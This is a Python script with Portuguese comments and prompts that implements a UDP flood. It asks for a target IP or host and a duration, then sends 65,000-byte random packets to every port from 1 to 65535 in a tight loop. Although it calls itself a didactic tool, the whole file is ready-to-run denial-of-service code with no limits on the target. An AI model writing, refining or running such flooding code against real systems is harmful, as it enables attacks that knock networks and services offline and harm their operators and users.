#!/usr/bin/env python3
"""Script simples para enviar muitos pacotes UDP a um IP."""

import random
import socket
import sys
import time

DEFAULT_PACKET_SIZE = 65000
DEFAULT_PAUSE = 0.0001
DEFAULT_DURATION = 10


def udp_flood(target: str, duration: float, packet_size: int = DEFAULT_PACKET_SIZE, pause: float = DEFAULT_PAUSE) -> int:
	"""Envia pacotes UDP para todas as portas enquanto a duração não expira."""
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	data = random._urandom(packet_size)
	sent = 0
	start = time.time()
	try:
		while time.time() - start < duration:
			for port in range(1, 65536):
				if time.time() - start >= duration:
					break
				sock.sendto(data, (target, port))
				sent += 1
				print(f"Pacotes enviados: {sent} para {target}:{port}")
				time.sleep(pause)
	except KeyboardInterrupt:
		print("\nParando envio a pedido do usuário.")
	finally:
		sock.close()
	return sent


def _parse_args(argv):
	target = None
	duration = None
	if argv:
		target = argv[0]
	if len(argv) > 1:
		try:
			duration = float(argv[1])
		except ValueError:
			print("Duração inválida fornecida via argumento. Usando valor padrão.")
	return target, duration


def main(argv=None):
	argv = [] if argv is None else list(argv)
	arg_target, arg_duration = _parse_args(argv)
	print("Ferramenta didática de UDP flood")
	alvo = arg_target or input("Informe o IP ou host do alvo: ").strip()
	if not alvo:
		print("Nenhum alvo informado. Saindo.")
		return

	if arg_duration is not None:
		tempo_execucao = arg_duration
	else:
		tempo_bruto = input(
			"Por quantos segundos enviar (Enter usa 10 segundos): "
		).strip()
		if tempo_bruto:
			try:
				tempo_execucao = float(tempo_bruto)
			except ValueError:
				print("Valor inválido. Usando 10 segundos.")
				tempo_execucao = DEFAULT_DURATION
		else:
			tempo_execucao = DEFAULT_DURATION

	enviados = udp_flood(alvo, tempo_execucao)
	print(f"Total enviado: {enviados} pacotes em {tempo_execucao} segundos.")


if __name__ == "__main__":
	main(sys.argv[1:])
